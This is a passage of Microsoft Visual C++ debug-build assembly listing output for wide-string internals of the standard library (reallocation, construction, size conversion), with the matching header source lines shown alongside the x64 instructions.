; 4782 :             _Xlen_string(); // result too long

  0006d	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Reallocate:

; 4783 :         }
; 4784 : 
; 4785 :         const size_type _Old_capacity = _Mypair._Myval2._Myres;

  00072	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00079	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  0007d	48 89 45 08	 mov	 QWORD PTR _Old_capacity$[rbp], rax

; 4786 :         size_type _New_capacity       = _Calculate_growth(_New_size);

  00081	48 8b 95 68 01
	00 00		 mov	 rdx, QWORD PTR _New_size$[rbp]
  00088	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0008f	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  00094	48 89 45 28	 mov	 QWORD PTR _New_capacity$[rbp], rax

; 4787 :         auto& _Al                     = _Getal();

  00098	48 8b 8d 60 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009f	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  000a4	48 89 45 48	 mov	 QWORD PTR _Al$[rbp], rax

; 4788 :         const pointer _New_ptr        = _Allocate_for_capacity(_Al, _New_capacity); // throws

  000a8	48 8d 55 28	 lea	 rdx, QWORD PTR _New_capacity$[rbp]
  000ac	48 8b 4d 48	 mov	 rcx, QWORD PTR _Al$[rbp]
  000b0	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  000b5	48 89 45 68	 mov	 QWORD PTR _New_ptr$[rbp], rax

; 4789 : 
; 4790 :         _Mypair._Myval2._Orphan_all();

  000b9	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000c0	48 8b c8	 mov	 rcx, rax
  000c3	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4791 :         _ASAN_STRING_REMOVE(*this);
; 4792 :         _Mypair._Myval2._Mysize = _New_size;

  000c8	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000cf	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR _New_size$[rbp]
  000d6	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 4793 :         _Mypair._Myval2._Myres  = _New_capacity;

  000da	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000e1	48 8b 4d 28	 mov	 rcx, QWORD PTR _New_capacity$[rbp]
  000e5	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 4794 :         _Fn(_Unfancy(_New_ptr), _New_size, _Args...);

  000e9	48 8b 4d 68	 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  000ed	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  000f2	4c 8b 8d 78 01
	00 00		 mov	 r9, QWORD PTR <_Args_0>$[rbp]
  000f9	4c 8b 85 68 01
	00 00		 mov	 r8, QWORD PTR _New_size$[rbp]
  00100	48 8b d0	 mov	 rdx, rax
  00103	48 8d 8d 70 01
	00 00		 lea	 rcx, QWORD PTR _Fn$[rbp]
  0010a	e8 00 00 00 00	 call	 ??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()

; 4795 :         if (_Old_capacity > _Small_string_capacity) {

  0010f	48 83 7d 08 07	 cmp	 QWORD PTR _Old_capacity$[rbp], 7
  00114	76 27		 jbe	 SHORT $LN3@Reallocate

; 4796 :             _Deallocate_for_capacity(_Al, _Mypair._Myval2._Bx._Ptr, _Old_capacity);

  00116	4c 8b 45 08	 mov	 r8, QWORD PTR _Old_capacity$[rbp]
  0011a	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00121	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  00124	48 8b 4d 48	 mov	 rcx, QWORD PTR _Al$[rbp]
  00128	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity

; 4797 :             _Mypair._Myval2._Bx._Ptr = _New_ptr;

  0012d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00134	48 8b 4d 68	 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00138	48 89 08	 mov	 QWORD PTR [rax], rcx

; 4798 :         } else {

  0013b	eb 13		 jmp	 SHORT $LN4@Reallocate
$LN3@Reallocate:

; 4799 :             _Construct_in_place(_Mypair._Myval2._Bx._Ptr, _New_ptr);

  0013d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00144	48 8d 55 68	 lea	 rdx, QWORD PTR _New_ptr$[rbp]
  00148	48 8b c8	 mov	 rcx, rax
  0014b	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
$LN4@Reallocate:

; 4800 :         }
; 4801 : 
; 4802 :         _ASAN_STRING_CREATE(*this);
; 4803 :         return *this;

  00150	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
$LN5@Reallocate:

; 4804 :     }

  00157	48 8b f8	 mov	 rdi, rax
  0015a	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  0015e	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z$rtcFrameData
  00165	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  0016a	48 8b c7	 mov	 rax, rdi
  0016d	48 8b 8d 38 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00174	48 33 cd	 xor	 rcx, rbp
  00177	e8 00 00 00 00	 call	 __security_check_cookie
  0017c	48 8d a5 48 01
	00 00		 lea	 rsp, QWORD PTR [rbp+328]
  00183	5f		 pop	 rdi
  00184	5d		 pop	 rbp
  00185	c3		 ret	 0
??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z
_TEXT	SEGMENT
$T1 = 196
this$ = 256
_New_ptr$ = 264
_Count$ = 272
_Ptr$ = 280
??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z PROC ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator(), COMDAT

; 3424 :             [](_Elem* const _New_ptr, const size_type _Count, const _Elem* const _Ptr) {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00029	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3425 :                 _Traits::copy(_New_ptr, _Ptr, _Count);

  0002e	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  00035	48 8b 95 18 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  0003c	48 8b 8d 08 01
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00043	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 3426 :                 _Traits::assign(_New_ptr[_Count], _Elem());

  00048	33 c0		 xor	 eax, eax
  0004a	66 89 85 c4 00
	00 00		 mov	 WORD PTR $T1[rbp], ax
  00051	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR _New_ptr$[rbp]
  00058	48 8b 8d 10 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0005f	48 8d 04 48	 lea	 rax, QWORD PTR [rax+rcx*2]
  00063	48 8d 95 c4 00
	00 00		 lea	 rdx, QWORD PTR $T1[rbp]
  0006a	48 8b c8	 mov	 rcx, rax
  0006d	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 3427 :             },

  00072	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00079	5f		 pop	 rdi
  0007a	5d		 pop	 rbp
  0007b	c3		 ret	 0
??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z ENDP ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
_TEXT	SEGMENT
_Ptr$ = 224
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z PROC			; std::_Unfancy<wchar_t>, COMDAT

; 35   : _NODISCARD constexpr _Ty* _Unfancy(_Ty* _Ptr) noexcept { // do nothing for plain pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 36   :     return _Ptr;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]

; 37   : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ENDP			; std::_Unfancy<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$_Convert_size@_K_K@std@@YA_K_K@Z
_TEXT	SEGMENT
_Len$ = 224
??$_Convert_size@_K_K@std@@YA_K_K@Z PROC		; std::_Convert_size<unsigned __int64,unsigned __int64>, COMDAT

; 1112 :     sizeof(_Unsigned_type) <= sizeof(_Size_type)) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1113 :     // convert _Unsigned_type to _Size_type, avoiding truncation
; 1114 :     _STL_INTERNAL_STATIC_ASSERT(_Unsigned_type(-1) > 0);
; 1115 :     _STL_INTERNAL_STATIC_ASSERT(_Size_type(-1) > 0);
; 1116 : 
; 1117 :     if constexpr (sizeof(_Unsigned_type) > sizeof(_Size_type)) {
; 1118 :         if (_Len > (numeric_limits<_Size_type>::max)()) {
; 1119 :             _Xlength_error("size is too long for _Size_type");
; 1120 :         }
; 1121 :     }
; 1122 : 
; 1123 :     return static_cast<_Size_type>(_Len);

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Len$[rbp]

; 1124 : }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??$_Convert_size@_K_K@std@@YA_K_K@Z ENDP		; std::_Convert_size<unsigned __int64,unsigned __int64>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
_TEXT	SEGMENT
_My_data$ = 8
_Al$ = 40
_Alproxy$ = 72
_Proxy$ = 100
_New_capacity$ = 136
_New_ptr$ = 168
tv135 = 376
__$ArrayPad$ = 384
this$ = 432
_Arg$ = 440
_Count$ = 448
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>, COMDAT

; 2659 :     _CONSTEXPR20 void _Construct(const _Char_or_ptr _Arg, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN5:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec b8 01
	00 00		 sub	 rsp, 440		; 000001b8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00022	b9 36 00 00 00	 mov	 ecx, 54			; 00000036H
  00027	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002c	f3 ab		 rep stosd
  0002e	48 8b 8c 24 d8
	01 00 00	 mov	 rcx, QWORD PTR [rsp+472]
  00036	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0003d	48 33 c5	 xor	 rax, rbp
  00040	48 89 85 80 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00047	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0004e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2660 :         auto& _My_data = _Mypair._Myval2;

  00053	48 8b 85 b0 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0005a	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 2661 :         _STL_INTERNAL_CHECK(!_My_data._Large_mode_engaged());
; 2662 : 
; 2663 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2664 :             _STL_INTERNAL_STATIC_ASSERT(is_same_v<_Char_or_ptr, _Elem>);
; 2665 :         } else {
; 2666 :             _STL_INTERNAL_STATIC_ASSERT(_Is_elem_cptr<_Char_or_ptr>::value);
; 2667 :         }
; 2668 : 
; 2669 :         if (_Count > max_size()) {

  0005e	48 8b 8d b0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00065	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  0006a	48 39 85 c0 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  00071	76 05		 jbe	 SHORT $LN2@Construct

; 2670 :             _Xlen_string(); // result too long

  00073	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
$LN2@Construct:

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();

  00078	48 8b 8d b0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00084	48 89 45 28	 mov	 QWORD PTR _Al$[rbp], rax

; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);

  00088	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
  0008f	48 89 45 48	 mov	 QWORD PTR _Alproxy$[rbp], rax

; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);

  00093	4c 8b 45 08	 mov	 r8, QWORD PTR _My_data$[rbp]
  00097	48 8b 55 48	 mov	 rdx, QWORD PTR _Alproxy$[rbp]
  0009b	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  0009f	e8 00 00 00 00	 call	 ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl

; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  000a4	48 83 bd c0 01
	00 00 07	 cmp	 QWORD PTR _Count$[rbp], 7
  000ac	77 42		 ja	 SHORT $LN3@Construct

; 2678 :             _My_data._Mysize = _Count;

  000ae	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000b2	48 8b 8d c0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  000b9	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  000bd	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000c1	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 2680 : 
; 2681 :             if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2682 :                 _Traits::assign(_My_data._Bx._Buf, _Count, _Arg);
; 2683 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2684 :             } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2685 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count);
; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());
; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);

  000c9	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  000cd	41 b8 08 00 00
	00		 mov	 r8d, 8
  000d3	48 8b 95 b8 01
	00 00		 mov	 rdx, QWORD PTR _Arg$[rbp]
  000da	48 8b c8	 mov	 rcx, rax
  000dd	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();

  000e2	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  000e6	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release

; 2696 :             return;

  000eb	e9 ae 00 00 00	 jmp	 $LN1@Construct
$LN3@Construct:

; 2697 :         }
; 2698 : 
; 2699 :         size_type _New_capacity = _Calculate_growth(_Count, _Small_string_capacity, max_size());

  000f0	48 8b 8d b0 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f7	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  000fc	4c 8b c0	 mov	 r8, rax
  000ff	ba 07 00 00 00	 mov	 edx, 7
  00104	48 8b 8d c0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0010b	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
  00110	48 89 85 88 00
	00 00		 mov	 QWORD PTR _New_capacity$[rbp], rax

; 2700 :         const pointer _New_ptr  = _Allocate_for_capacity(_Al, _New_capacity); // throws

  00117	48 8d 95 88 00
	00 00		 lea	 rdx, QWORD PTR _New_capacity$[rbp]
  0011e	48 8b 4d 28	 mov	 rcx, QWORD PTR _Al$[rbp]
  00122	e8 00 00 00 00	 call	 ??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Allocate_for_capacity<0>
  00127	48 89 85 a8 00
	00 00		 mov	 QWORD PTR _New_ptr$[rbp], rax

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  0012e	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00132	48 8d 95 a8 00
	00 00		 lea	 rdx, QWORD PTR _New_ptr$[rbp]
  00139	48 8b c8	 mov	 rcx, rax
  0013c	e8 00 00 00 00	 call	 ??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>

; 2702 : 
; 2703 :         _My_data._Mysize = _Count;

  00141	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00145	48 8b 8d c0 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0014c	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 2704 :         _My_data._Myres  = _New_capacity;

  00150	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00154	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR _New_capacity$[rbp]
  0015b	48 89 48 18	 mov	 QWORD PTR [rax+24], rcx

; 2705 :         if constexpr (_Strat == _Construct_strategy::_From_char) {
; 2706 :             _Traits::assign(_Unfancy(_New_ptr), _Count, _Arg);
; 2707 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2708 :         } else if constexpr (_Strat == _Construct_strategy::_From_ptr) {
; 2709 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count);
; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());
; 2711 :         } else { // _Strat == _Construct_strategy::_From_string
; 2712 :             _Traits::copy(_Unfancy(_New_ptr), _Arg, _Count + 1);

  0015f	48 8b 85 c0 01
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00166	48 ff c0	 inc	 rax
  00169	48 89 85 78 01
	00 00		 mov	 QWORD PTR tv135[rbp], rax
  00170	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR _New_ptr$[rbp]
  00177	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0017c	48 8b 8d 78 01
	00 00		 mov	 rcx, QWORD PTR tv135[rbp]
  00183	4c 8b c1	 mov	 r8, rcx
  00186	48 8b 95 b8 01
	00 00		 mov	 rdx, QWORD PTR _Arg$[rbp]
  0018d	48 8b c8	 mov	 rcx, rax
  00190	e8 00 00 00 00	 call	 ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy

; 2713 :         }
; 2714 : 
; 2715 :         _ASAN_STRING_CREATE(*this);
; 2716 :         _Proxy._Release();

  00195	48 8d 4d 64	 lea	 rcx, QWORD PTR _Proxy$[rbp]
  00199	e8 00 00 00 00	 call	 ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ; std::_Fake_proxy_ptr_impl::_Release
$LN1@Construct:
$LN4@Construct:

; 2717 :     }

  0019e	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  001a2	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcFrameData
  001a9	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  001ae	48 8b 8d 80 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  001b5	48 33 cd	 xor	 rcx, rbp
  001b8	e8 00 00 00 00	 call	 __security_check_cookie
  001bd	48 8d a5 98 01
	00 00		 lea	 rsp, QWORD PTR [rbp+408]
  001c4	5f		 pop	 rdi
  001c5	5d		 pop	 rbp
  001c6	c3		 ret	 0
??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>, COMDAT

; 1523 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00023	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002a	e8 00 00 00 00	 call	 ??0?$allocator@_W@std@@QEAA@XZ ; std::allocator<wchar_t>::allocator<wchar_t>
  0002f	48 8b 85 e0 00
